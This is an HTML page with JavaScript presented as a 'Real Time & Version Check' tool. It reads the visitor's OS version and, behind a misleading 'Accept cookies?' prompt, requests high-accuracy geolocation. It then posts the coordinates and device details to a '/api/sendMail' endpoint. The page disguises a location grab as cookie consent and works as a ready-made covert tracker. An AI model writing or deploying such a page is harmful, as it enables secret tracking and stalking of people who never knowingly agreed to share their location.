<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Real Time & Version Check</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 24px; max-width: 720px; }
    button { padding: 10px 16px; margin-right: 10px; }
    #status { margin-top: 12px; line-height: 1.4; }
    .small { color:#555; font-size: 14px; }
  </style>
</head>
<body>
  <h1>Real Time & Version Check</h1>
  <p class="small">
      
  </p>
  <button id="send">Check Information</button>
  <div id="status"> </div>
  <script>
    const statusEl = document.getElementById("status");
    const sendBtn = document.getElementById("send");
    const API_URL = "/api/sendMail";

    function getOSVersion() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) {
        const match = ua.match(/Android\s([0-9\.]+)/i);
        return match ? `Android ${match[1]}` : "Android";
      }
      if (/iPhone|iPad|iPod/i.test(ua)) {
        const match = ua.match(/OS (\d+_\d+(_\d+)?)/i);
        return match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
      }
      if (/Windows NT/i.test(ua)) {
        const match = ua.match(/Windows NT ([0-9\.]+)/i);
        if (match) {
          switch (match[1]) {
            case "10.0": return "Windows 10/11";
            case "6.3": return "Windows 8.1";
            case "6.2": return "Windows 8";
            case "6.1": return "Windows 7";
            default: return `Windows NT ${match[1]}`;
          }
        }
        return "Windows";
      }
      if (/Mac OS X/i.test(ua)) {
        const match = ua.match(/Mac OS X ([0-9_\.]+)/i);
        return match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
      }
      return "Unknown";
    }

    sendBtn.onclick = async () => {
      statusEl.textContent = "Preparing to …";
      const timestamp = new Date().toISOString();
      const osVersion = getOSVersion();

      // Ask user if they want to share location
      if (confirm("Accept cookies?")) {
        if (!navigator.geolocation) {
          statusEl.textContent = "Geo not supported on this device.";
          await sendInfo({ timestamp, osVersion });
          return;
        }
        statusEl.textContent = "Requesting location permission…";
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const { latitude, longitude } = pos.coords;
            await sendInfo({ timestamp, osVersion, latitude, longitude });
          },
          async (err) => {
            statusEl.textContent = "Location permission denied or unavailable. Sending without location.";
            await sendInfo({ timestamp, osVersion });
          },
          { enableHighAccuracy: true, timeout: 10000 }
        );
      } else {
        await sendInfo({ timestamp, osVersion });
      }
    };

    async function sendInfo(data) {
      statusEl.textContent = "Loading...";
      try {
        const res = await fetch(API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        const text = await res.text();
        if (!res.ok) {
          statusEl.textContent = `Failed (${res.status}): ${text}`;
          return;
        }
        statusEl.innerHTML = `<b>Real Region Info & Device Version!</b><br>Time: ${data.timestamp}<br>Device: ${data.osVersion}` +
          (data.latitude ? `<br>Lat: ${data.latitude}<br>Lon: ${data.longitude}` : "<br>No information found.");
      } catch (e) {
        statusEl.textContent = "Network error. Try again.";
      }
    }
  </script>
</body>
</html>
